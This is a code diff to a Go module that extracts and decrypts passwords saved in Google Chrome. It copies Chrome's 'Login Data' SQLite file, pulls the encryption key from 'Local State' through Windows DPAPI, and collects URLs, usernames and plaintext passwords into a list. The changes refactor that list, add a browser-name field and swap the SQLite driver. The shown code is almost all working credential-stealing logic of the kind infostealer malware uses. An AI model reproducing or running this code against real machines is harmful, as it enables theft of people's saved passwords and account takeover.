@@ -11,7 +11,8 @@ import (
 	"os"
 
 	"github.com/billgraziano/dpapi"
-	_ "github.com/mattn/go-sqlite3"
+	// _ "github.com/mattn/go-sqlite3"
+	_ "modernc.org/sqlite"
 )
 
 var (
@@ -19,18 +20,15 @@ var (
 	CHROME_PATH_LOGIN_DATA  = fmt.Sprintf("%s/Google/Chrome/User Data/Default/Login Data", LOCALAPPDATA)
 )
 
-func Chrome() BrowserConfig {
-	credentials := BrowserConfig{
-		Browser:     "chrome",
-		Credentials: []Credential{},
-	}
+func Chrome() []Credential {
+	credentials := []Credential{}
 
 	secretKey, err := getSecretKey(CHROME_PATH_LOCAL_STATE)
 	if err != nil {
 		fmt.Println(err.Error())
 		return credentials
 	}
-	err = getLoginData(CHROME_PATH_LOGIN_DATA, secretKey, &credentials)
+	err = getLoginData("Chrome", CHROME_PATH_LOGIN_DATA, secretKey, &credentials)
 	if err != nil {
 		fmt.Println(err.Error())
 		return credentials
@@ -131,7 +129,7 @@ func decryptPassword(ciphertext string, secretKey []byte) (string, error) {
 // ****************************************************
 // GET LOGIN DATA
 // ****************************************************
-func getLoginData(loginDataPath string, secretKey []byte, credentials *BrowserConfig) error {
+func getLoginData(browser, loginDataPath string, secretKey []byte, credentials *[]Credential) error {
 	// copy the Login Data sqlite3 file to a temp file
 	tempFile, err := os.CreateTemp("", "chrome_login_data_*.db")
 	if err != nil {
@@ -151,7 +149,7 @@ func getLoginData(loginDataPath string, secretKey []byte, credentials *BrowserCo
 	}
 
 	// Connect to sqlite3 database
-	db, err := sql.Open("sqlite3", tempFile.Name())
+	db, err := sql.Open("sqlite", tempFile.Name())
 	if err != nil {
 		fmt.Println(err.Error())
 		return err
@@ -192,7 +190,8 @@ func getLoginData(loginDataPath string, secretKey []byte, credentials *BrowserCo
 		}
 
 		// Add the credential to the list
-		credentials.Credentials = append(credentials.Credentials, Credential{
+		*credentials = append(*credentials, Credential{
+			Browser:  browser,
 			URL:      url,
 			Username: username,
 			Password: password,
